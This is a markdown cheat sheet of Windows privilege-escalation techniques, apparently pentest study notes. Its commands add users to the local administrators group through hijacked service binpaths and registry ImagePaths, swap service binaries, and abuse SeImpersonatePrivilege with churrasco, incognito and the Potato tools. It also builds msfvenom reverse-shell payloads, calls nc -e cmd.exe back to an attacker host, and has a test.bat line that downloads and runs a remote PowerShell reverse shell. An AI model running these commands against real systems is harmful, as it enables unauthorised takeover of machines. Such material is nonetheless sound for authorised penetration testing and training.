
- [Windows kernel exploits](#Windows-kernel-exploits)
- [Service escalation](#Service-escalation)
- [Weak folder permissions TODO!!!](#Weak-folder-permissions)
- [Token Kidnapping (churrasco)](#Token-Kidnapping)
- [Token impersonation](#Token-impersonation)
- [Metasploit](#Metasploit)
- [Hot Potato/Rotten Patato](#Hot-Potato)
- [Alternate Data Streams](#Alternate-data-streams)
- [Impersonation Privileges](#Impersonation-Privileges)
- [Registers overview](#Registers-overview)
- [Running powerup for privesc](#Running-powerUp-for-privesc)
- [Check user installed programs](#Check-user-installed-programs)
- [Enumeration Bloodhound]($Enumeration-bloodhound)
- [Scheduled tasks](#Scheduled-tasks)
- [Insecure GUI Apps](#Insecure-GUI-Apps)
- [Enumerating Applications and Patch Levels](#Enumerating-Applications-and-Patch-Levels)
- [Enumerating Unmounted Disks](#Enumerating-Unmounted-Disks)
- [JAWS tools](#JAWS-tool)
- [Tools](#Tools)

--------------------------------------------------------------------------------------------------------------------------------------
# Get information about Windows machine

- Check powershell process architecture
- 
x32
```
[Environment]::Is32BitProcess
```

x64
```
[Environment]::Is64BitProcess
```


--------------------------------------------------------------------------------------------------------------------------------------

# Service escalation


## Service escalation binpath

- Running accesschk
Check all services with RW Access by everyone
```
accesschk64.exe -uwcv Everyone *
```
- check service
```
accesschk64.exe -wuvc service_name
```
- check binaryPath name
```
sc qc service_name
```
- change the configuration 
```
sc config service_name binpath= "net localgroup administrators user /add"
```
- sc start service_name

- check admin group
```
net localgroup administrators
```

## Service escalation registry
- regsvc(Register service) Check we have fullcontrol over Register key 
```
powershell -ep bypass
```
- In powershell prompt type:
```
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```
- Check output access in NT AUTHORY\INTERACTIVE filed, for example:
```
"NT AUTHORITY\INTERACTIVE" has "FullContol" permission over the registry key.
```
- create malicious file with:
```
cmd.exe /k net localgroup administrators user /add
```
- compile file via migw32
```
x86_64-w64-mingw32-gcc windows_service.c -o x.exe


* installation sudo apt install gcc-mingw-w64
 ```
- Place x.exe in C:\Temp folder
- Type in command prompt
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f

sc start regsvc
```
- Confirm that the user was added to the local admin group by typing the following command
```
net localgroup administrators
```


## Insecure registery permissions
- Check services
```
Wmic service get name | findstr /i /v "C:\Windows\\"
```

- If there is a service and users has full control permission on the service

- examaple check for regsvc
```
subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc" /display

example output: 
[...]
BINARY_PATH_NAME : "C:\Program Files\Insecure Registry Service\insecureregisteryservice.exe"
[...]
```

- Create a payload for get a reverse tcp connection and upload to target system
```
msfvenom -p windows/shell_reverse_tcp lhost=<your_ip> lport=<your_port> -f exe -o common.exe
```
- Chance the BINARY_PATH_NAME in registery records
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\regsvc" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\user\AppData\Local\Temp\common.exe" /f
```

- Check the BINARY_PATH_NAME is updated

- Start the service
```
net start regsvc
```

--------------------------------------------------------------------------------------------------------------------------------------

# Weak folder permissions

If a user has write permission in a folder used by a service, he can replace the binary with a malicious one. When the service is restarted the malicious binary is executed with higher privileges.

- Check folder permissions
```
TO DO
```

- Folder permissions exploitation
```
copy /y C:\Users\user\Desktop\shell.exe "c:\Program Files\File Permissions Service\filepermservice.exe"

sc start filepermsvc
```

## service

--------------------------------------------------------------------------------------------------------------------------------------

# Token Kidnapping

##  Token Kidnapping Description

Network Service account is a special built-in account that has reduced privileges similar to an authenticated user account. This limited access helps safeguard the computer if an attacker compromises individual services or processes. Basically, Server 2003 allows for the NETWORK SERVICE and LOCAL SERVICE accounts to impersonate the SYSTEM account, if this privilege is enabled.

- check user
```
whoami /all

are you nt authority\network service?
```

- Check SeImpersonatePrivilege privilege is enabled?
```
whoami /priv
```

- Upload churrasco.exe
```
https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
```

- Create user *add user to localgroup Administrator*
```
churrasco.bin "net user oscp oscp /add && net localgroup Administrators oscp /add"
```

- Create connection *nc connection*
```
churrasco.exe "nc.exe <your_machine_ip> <your_machine_port> -e cmd.exe"
```

- Create reverse shell
```
msfvenom -p windows/shell_reverse_tcp lhost=<your_ip_address> lport=<your_port> -f exe -o revshell.exe
upload revshell.exe to machine
```

- churrasco.exe -d "C:\revshell\exe\path\"

- run netcat listener on kali machine
```
nc -lnvp xyz
```

## Token kidnapping case study one
- on Windows machine create c:\temp folder
- on linux machine run smb server:
```
python smbserver share smb
```
-move churrasco.exe to smb folder
-on windows machine
```
copy \\<kali_ip>\share\churrasco.exe
```
- create msfvenom payload
```
msfvenom -p windows/shell_reverse_tcp lhost=<kali_ip> lport=4444 -f exe -o rs.exe
```
send rs.exe via smb and run:
```
churrasco.exe -d "C:\temp\rs.exe"
```
-----------------------------------------------------------------------------------------------------------------------------------
# Token impersonation

## Token impersonation description
- Tokens are temporary keys allow you access to a system/network without having to provide credentials each time you access the file.
 There are two types of token:
 
 Delegate: create for logging into a machine or using Remote Desktop
 Impersonate: attaching a network drive or a domain logon script
 
## Token impersonation enumeration
```
whoami /priv 
```
to see any privilege is open to impersonate eg (SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege)
if have use JuicyPotato, RottenPotat
 
 ## Token impersonation exploitation
 - meterpreter
 ```
getuid
 
load incognito
 
list_tokens -u
 
  - Check for available tokens - 
  
impersonate_token example\\token
 
shell
```
- Check whoami
```
whoami
```

# Hot Potato
Technique is actually a combination of two known windows issues  like NBNS spoofing and NTLM relay with the implementation of a fake WPAD proxy server which is running locally on the target host.

NTLM authentication via the same protocol like SMB has been already patched by Microsoft however this technique is using HTTP to SMB authentication in order to create a high privilege service as the HTTP request might come from a high privilege service like the Windows update. Since the traffic contains the NTLM credentials and is passing through a fake proxy server it can be captured and passed to a local SMB listener to create an elevated service which can execute any command  as SYSTEM.
https://foxglovesecurity.com/2016/01/16/hot-potato/

#### Important
Attack can only be done if attackers current account has the privilage to impresonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.

## Authenticated user hot potato
- https://github.com/foxglovesec/Potato
Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
Potato.exe -ip [IP] -cmd "C:\\Windows\\System32\\cmd.exe -K net localgroup administrator [username] /ADD" -disable_exhaust true -disable _defender true

## Hot Potato via powershell

- https://github.com/Kevin-Robertson/Tater

## Juicy potato
- https://github.com/ohpe/juicy-potato
- https://github.com/ohpe/juicy-potato/releases

- Execute juicy potato
```
./jp.exe -t * -p test.bat -l 4445

test.bat:
powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.49:9090/Invoke-PowerShellTcp.ps1')
```
--------------------------------------------------------------------------------------------------------------------------------------
# Alternate data streams
Alternate Data Streams (ADS) are a file attribute only found on the NTFS file system. It is a way to hide some information in file.
- check file for ADS
```
dir /R

example
more < hm.txt:root.txt:$DATA
```

# Impersonation Privileges

## Impersonation Privileges basic
- execute command on command line:
```
whoami /priv

[...]
SeImpersonatePrivilege Enable
[...]
```
- execute command on meterpreter:
```
meterpreter> getprivs

[...]
SeImpersonatePrivilege Enable
[...]
```
## Usefull resources
- https://github.com/gtworek/Priv2Admin

--------------------------------------------------------------------------------------------------------------------------------------
# Check user installed programs

## User installed programs
(run in powershell)
```
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallDate
```

## List user installed application (use wmic)
```
wmic product get name, version, vendor

wmic gfe get Caption, Description, HotFixID, InstalledOn
```



---------------------------------------------------------------------------------------------------------------------------------------
# Scheduled tasks
- Enumerate Scheduled Tasks
```
schtasks /query /fo LIST /v
```

---------------------------------------------------------------------------------------------------------------------------------------
# Enumerating Applications and Patch Levels

- Enumerate all installed applications
```
wmic product get name, version, vendor
```
- Enumerate sytem updates
```
wmic gfe get Caption, Description, HotFixID, InstalledOn
```


--------------------------------------------------------------------------------------------------------------------------------------
# Enumerating Unmounted Disks
```
mountvol
```
--------------------------------------------------------------------------------------------------------------------------------------
# Enumerating Device Drivers and Kernel Modules
```
powershell

driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
```

```
Powershell

Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "text"}
```
--------------------------------------------------------------------------------------------------------------------------------------
# JAWS-tool
```
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
```


